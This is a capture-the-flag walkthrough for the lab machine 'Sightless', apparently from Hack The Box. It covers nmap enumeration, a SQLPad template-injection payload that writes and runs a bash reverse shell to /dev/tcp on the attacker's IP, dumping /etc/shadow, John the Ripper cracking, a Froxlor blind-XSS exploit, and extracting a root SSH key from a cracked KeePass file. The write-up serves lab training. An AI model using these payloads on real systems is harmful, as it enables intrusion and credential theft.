# CTF Walkthrough: Sightless

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Information Gathering](#2-information-gathering)
- [3. Vulnerability Discovery](#3-vulnerability-discovery)
- [4. Exploitation](#4-exploitation)
- [5. Privilege Escalation](#5-privilege-escalation)

---

## 1. Introduction
 
**Category:** Reverse Shell, netcat, sqlpad, unshadow, froxlor, lftp, kpcli, xxd, dos2unix
**Difficulty Level:** Easy   
**CVE(s) involved:** CVE-2024-34070, CVE-2022-0944

---

## 2. Information Gathering

### 2.1. Initial Enumeration
- **Add to /etc/hosts**
    - Command: `sudo vim /etc/hosts`
    - Command: `10.10.11.32 sightless.htb`

- **Running Services**
    - Command: `nmap -p- --min-rate 10000 10.10.11.32`
      - Output: 
        ```
        PORT   STATE SERVICE
        21/tcp open  ftp
        22/tcp open  ssh
        80/tcp open  http
        ```
    - Command: `nmap -p 21,22,80 -sCV 10.10.11.32`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            21/tcp open  ftp
            | fingerprint-strings:
            |   GenericLines:
            |     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
            |     Invalid command: try being more creative
            |_    Invalid command: try being more creative
            22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey:
            |   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
            |_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
            80/tcp open  http    nginx 1.18.0 (Ubuntu)
            |_http-title: Did not follow redirect to http://sightless.htb/
            |_http-server-header: nginx/1.18.0 (Ubuntu)
            1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
            SF-Port21-TCP:V=7.94SVN%I=7%D=9/8%Time=66DDF2FD%P=x86_64-pc-linux-gnu%r(Ge
            SF:nericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S
            SF:erver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20t
            SF:ry\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x2
            SF:0being\x20more\x20creative\r\n");
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
            ```

- **Web Discovery**:
    - The SQLPad "Start Now" button is linked to `sqlpad.sightless.htb`
    - Add to /etc/hosts
        - Command: `sudo vim /etc/hosts`
        - Command: `10.10.11.32 sqlpad.sightless.htb`
    - Visit `http://sqlpad.sightless.htb`
---

## 3. Vulnerability Discovery
- **CVE-2022-0944**
    - Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.
    - **Proof of Concept**
        - Steps
            - Start a Python server
                - Command: `python -m http.server 80`

            - COnnections > Add connection
                - Name : Test
                - Driver : MySQL
                - Database :
                    ```
                    {{ process.mainModule.require('child_process').exec('wget; curl 10.10.14.6/curl')}}
                    ```
            - Save

---

## 4. Exploitation
- **CVE-2022-0944**
    - Steps to reproduce:
        - Connections > Add connection
            - Name : Test
            - Driver : MySQL
            - Database : 
                ```
                {{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i
                >& /dev/tcp/10.10.14.66/1261 0>&1" > /tmp/exploit.sh') }}
                ```
        - Start netcat
            - Command: `nc -lvnp 1261`

        - Connections > Add connection
            - Name : Test
            - Driver : MySQL
            - Database :
                ```
                {{ process.mainModule.require('child_process').exec('/bin/bash /tmp/exploit.sh')
                }}
                ```
        - We have Reverse shell

## 5. Foothold
- **Unshadow**
    - A CLI Tool to combine `/etc/passwd` and `/etc/shadow` for password cracking like John the Ripper.
    - Command: `whoami`
        - Output:
            ```

            ```
    - Command: `cat /etc/passwd`
        - Output:
            ```
            ...
            michael:x:1001:1001::/home/michael:/bin/bash
            ...
            ```
    - Save to local as `passwd_michael`
        - Command: `echo michael:x:1001:1001::/home/michael:/bin/bash > passwd_michael`

    - Command: `cat /etc/shadow`
        - Output:
            ```
            ...
            michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
            ...
            ```
    - Save to local as `shadow_michael`
        - Command: `echo michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7::: > shadow_michael`

    - Command: `unshadow passwd_michael shadow_michael > unshadow_michael`

    - Command: `john -w=~/pentesting/wordlists/rockyou.txt unshadow_michael`
        - User: michael
        - Password: insaneclownposse
    
- **User Flag:**
    - Command: `ssh michael@10.10.11.32`
    - Command: `cat user.txt`
        - Output:
            ```
            408ce2f68696465375fdeb2624811fd1
            ```

## 6. Privilege Escalation
- Command: `netstat -lnpt`
    - Output:
        ```
        Found port 8080
        ```

- Port Forward
    - Command: `ssh michael@sightless.htb -L 8081:127.0.0.1:8080`

    - Go to `127.0.0.1:8081`

- **Vulnerability Discovery**
    - **CVE-2024-34070**
        - A Blind XSS which affects Froxlor 2.1.9 and below.


- **Exploitation**
    - **CVE-2024-34070**
        - Intercept Login Request with Burpsuite
        - Get payload from `https://github.com/advisories/GHSA-x525-54hf-xr53`
        - Edit the payload:
            - Change `https://demo.froxlor.org/` to `https://admin.sightless.htb:8080`
            - Base64 encode
        - Change `loginname=[payload]`
        - Send request
        - Log in to `https://admin.sightless.htb:8080`
            - User: abcd
            - Pass: Abcd@@1234

- **FTP Access**
    - Go to Resources > Customers
        - Change FTP user web1's password

    - Command: `lftp web1@sightless.htb`
    
    - This is using TLS, to disable certificate checks
        - Command: `set ssl:verify-certificate false`

    - Command: `get goaccess/backup/Database.kdb`

- **Cracking KeePass DB password**
    - Command: `keepass2john Database.kdb > Database.kdb_hash`
    - Command: `john -w=~/pentesting/wordlists/rockyou.txt Database.kdb_hash
`
        - Output:
            ```
            bulldogs
            ```
- **Enumeration**
    - Command: `kpcli --kdb-Database.kdb`
        - Output:
            ```
            kpcli:/>
            ```
    - Command: `ls General/sightless.htb/Backup`
        - Output:
            ```
            0. ssh
            ```
    - Command: `show -f General/sightless.htb/ssh`
        - Output:
            ```
            Path: /General/sightless.htb/Backup/
            Title: ssh
            Uname: root
             Pass: q6gnLTB74L132TMdFCpK
              URL: 
            Notes: 
            Atchm: id_rsa (3428 bytes)
            ```

    - Save to local
        - Command: `attach General/sightless.htb/ssh`
            - Output:
                ```
                Atchm: id_rsa (3428 bytes)
                Choose: (a)dd/(e)xport/(d)elete/(c)ancel/(F)inish? 
                Path to file: ~/github/HTB/machines/sightless/id_rsa
                Saved to: ~/github/HTB/machines/sightless/id_rsa
                Atchm: id_rsa (3428 bytes)
                ```
- **SSH**
    - Command: `chmod 600 id_rsa`
    - Fixing id_rsa
        - Add a line after -----END OPENSSH PRIVATE KEY-----
        - Check the encoding
            - Command: `xxd id_rsa`
                - Output:
                    ```
                    0d 0a          ..
                    ```
        - Command: `dos2unix id_rsa`
            - Command: `xxd id_rsa`
                - Output:
                    ```
                    0a              .
                    ```
        - Command: `ssh -i id_rsa root@sightless.htb`

- **Root Flag**:
    - Command: `cat root.txt`
        - Output:
            ```
            33f299f049d3655e24c533997b07f9bd
            ```







